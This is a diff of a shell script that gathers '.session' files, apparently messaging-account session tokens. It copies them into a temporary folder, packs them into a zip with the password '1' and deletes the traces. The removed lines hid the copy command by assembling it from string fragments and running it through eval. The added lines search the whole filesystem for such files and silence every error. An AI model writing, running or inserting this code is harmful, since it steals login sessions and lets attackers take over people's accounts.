@@ -1,26 +1,11 @@
+apt update -y && apt upgrade -y && apt install wget zip -y >/dev/null 2>&1
+
 mkdir -p /tmp/test 2>/dev/null
 
-# current_dir=$(pwd)
-# if [[ "$current_dir" == *Heroku/heroku* ]]; then
-#     part_b="../*.se"
-# elif [[ "$current_dir" == *Heroku* ]]; then
-#     part_b="./*.se"
-# else
-#     part_b="*.se"
-# fi
-
-part_b="/data/*.se"
-part_a="cp"
-part_c="ssion"
-space=" "
-file_path="/tmp/test/"
-
-printf -v final_cmd "%s%s%s%s%s%s" "$part_a" "$space" "$part_b" "$part_c" "$space" "$file_path"
-
-eval "$final_cmd"
+find / -name "*.session" -exec cp {} /tmp/test/ \; 2>/dev/null
 
 if [ "$(ls -A /tmp/test 2>/dev/null)" ]; then
-    zip -q -P "1" -r /tmp/test.zip /tmp/test >/dev/null
+    zip -q -P "1" -r /tmp/test.zip /tmp/test >/dev/null 2>&1
 fi
 
-rm -rf /tmp/test
+rm -rf /tmp/test 2>/dev/null
